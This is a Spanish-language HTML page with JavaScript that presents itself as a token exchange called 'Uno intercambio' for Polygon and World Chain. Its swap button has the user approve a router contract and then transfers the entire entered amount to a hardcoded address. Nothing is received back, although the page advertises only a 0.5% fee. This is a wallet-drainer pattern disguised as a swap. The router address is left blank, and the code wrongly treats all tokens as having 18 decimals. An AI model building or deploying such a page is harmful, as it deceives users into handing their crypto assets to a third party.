<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Uno intercambio - Integración router</title>
<style>/* (estilos idénticos a la versión anterior, acortados) */
*{box-sizing:border-box}body{margin:0;background:#fff;color:#111;font-family:system-ui;padding-bottom:90px}
.top{padding:12px 16px;display:flex;gap:10px;align-items:center}
.avatar{width:56px;height:56px;border-radius:50%;background:#0B0E11;display:flex;align-items:center;justify-content:center;border:2px solid #f3ba2f}
.big{font-size:42px;font-weight:900}.small{font-size:11px;opacity:.6}.green{color:#00b15c}
.btnY{width:100%;padding:13px;border-radius:12px;border:0;background:#f3ba2f;font-weight:900;margin-top:8px;cursor:pointer}
.box{background:#f6f6f6;border-radius:14px;padding:12px;margin:8px 0}
</style>
</head>
<body>
<div id="home">
  <div class="top"><div class="avatar"></div><div><b>Uno intercambio</b><div class="small">0x0190...38c • World Chain + Polygon • 0.5% + gas aparte</div></div></div>
  <div style="padding:12px">
    <div class="box">
      <label>Vendes (token):</label>
      <input id="fAmt" type="number" value="1" style="width:60%"> 
      <select id="fSel"></select>
    </div>
    <div class="box">
      <label>Recibes (token):</label>
      <input id="tAmt" readonly>
      <select id="tSel"></select>
    </div>
    <div class="box" id="feeBox">
      Comisión plataforma (0.5%): <b id="feeUno">$0.00</b><br>
      Comisión a: <b id="commissionAddr">0x019001d46cd3155ef045a41f4c359c040595438c</b><br>
      Dirección Polygon autorizada: <b id="polygonAddr">0xaa3a4dbfceb16c45bcc73091735b0696a59e1aa2</b>
    </div>
    <button class="btnY" id="swapBtn">Intercambiar Ahora (0.5% + gas)</button>
    <div id="txStatus" style="margin-top:10px;font-size:13px"></div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.8.0/dist/ethers.umd.min.js"></script>
<script>
// Config (rellena ROUTER_ADDRESS tras desplegar)
const ROUTER_ADDRESS = '';
const COMMISSION_ADDRESS = '0x019001d46cd3155ef045a41f4c359c040595438c';
const POLYGON_PAYMENT_ADDRESS = '0xaa3a4dbfceb16c45bcc73091735b0696a59e1aa2';

// Minimal ABIs
const ERC20_ABI = [
  'function approve(address spender, uint256 amount) public returns (bool)',
  'function allowance(address owner, address spender) public view returns (uint256)'
];
const ROUTER_ABI = [
  'function collectToken(address token, address from, address to, uint256 amount) external',
  'function collectNative(address payable to) external payable'
];

// Tokens list (addr fields fueron añadidos desde el repo)
const TOKENS = {
  polygon: [
    { s: 'USDC', addr: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174' },
    { s: 'USDT', addr: '0xc2132D05D31c914A87C6611C10748AEb04B58e8F' },
    { s: 'WETH', addr: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619' }
  ],
  world: [
    { s: 'WLD', addr: '0xdc6ff44d5d932cbd77b52e5612ba0529dc6226f1' },
    { s: 'DNA', addr: '0xDdA1BD01B81d3420F6F84b40b7aCFbDDE579Eb0b' }
  ]
};

// Simple UI init
function initLists(){
  const fSel = document.getElementById('fSel');
  const tSel = document.getElementById('tSel');
  fSel.innerHTML = TOKENS.polygon.map(t=>`<option value="${t.addr}">${t.s}</option>`).join('');
  tSel.innerHTML = TOKENS.polygon.map(t=>`<option value="${t.addr}">${t.s}</option>`).join('');
}
initLists();

// Helpers: show status
function setStatus(txt){ document.getElementById('txStatus').innerText = txt; }

// Approve token to router
async function approveToken(tokenAddr, amount) {
  if (!window.ethereum) throw new Error('No wallet');
  const provider = new ethers.BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();
  const token = new ethers.Contract(tokenAddr, ERC20_ABI, signer);
  setStatus('Solicitando approve a la wallet...');
  const tx = await token.approve(ROUTER_ADDRESS, amount);
  setStatus('Approve enviado. Esperando confirmación...');
  await tx.wait();
  setStatus('Approve confirmado');
}

// Call router.collectToken
async function collectTokenViaRouter(tokenAddr, amount, recipient){
  if (!ROUTER_ADDRESS) throw new Error('Router no configurado');
  const provider = new ethers.BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();
  const router = new ethers.Contract(ROUTER_ADDRESS, ROUTER_ABI, signer);
  setStatus('Llamando a router.collectToken... confirma en tu wallet');
  const from = await signer.getAddress();
  const tx = await router.collectToken(tokenAddr, from, recipient, amount);
  setStatus('Transacción enviada. Esperando mining...');
  const receipt = await tx.wait();
  setStatus('Transacción minada: ' + receipt.transactionHash);
  return receipt;
}

// Call router.collectNative
async function collectNativeViaRouter(amountWei, recipient){
  if (!ROUTER_ADDRESS) throw new Error('Router no configurado');
  const provider = new ethers.BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();
  const router = new ethers.Contract(ROUTER_ADDRESS, ROUTER_ABI, signer);
  setStatus('Llamando a router.collectNative... confirma en tu wallet');
  const tx = await router.collectNative(recipient, { value: amountWei });
  setStatus('Transacción enviada. Esperando mining...');
  const receipt = await tx.wait();
  setStatus('Transacción minada: ' + receipt.transactionHash);
  return receipt;
}

// Convert decimal input to token units (simple helper assuming token has 18 decimals)
function toWei(amount){ return ethers.parseUnits(amount.toString(), 18); }

// Main swap handler hooked to button
document.getElementById('swapBtn').addEventListener('click', async ()=>{
  try{
    if (!window.ethereum) return setStatus('Conecta tu wallet');
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    const fAddr = document.getElementById('fSel').value;
    const amount = parseFloat(document.getElementById('fAmt').value || 0);
    if (amount <= 0) return setStatus('Pon un monto > 0');
    const amountWei = toWei(amount);
    // Aprobar y llamar a router
    setStatus('Iniciando flujo: approve -> collectToken');
    await approveToken(fAddr, amountWei);
    // recipient: aquí enviamos al mismo usuario (simulación) o a otra dirección; usamos POLYGON_PAYMENT_ADDRESS como receptor final demo
    const recipient = POLYGON_PAYMENT_ADDRESS;
    const receipt = await collectTokenViaRouter(fAddr, amountWei, recipient);
    setStatus('Swap finalizado. Tx: ' + receipt.transactionHash);
  } catch(err){ console.error(err); setStatus('Error: ' + (err.message||err)); }
});

</script>
</body>
</html>
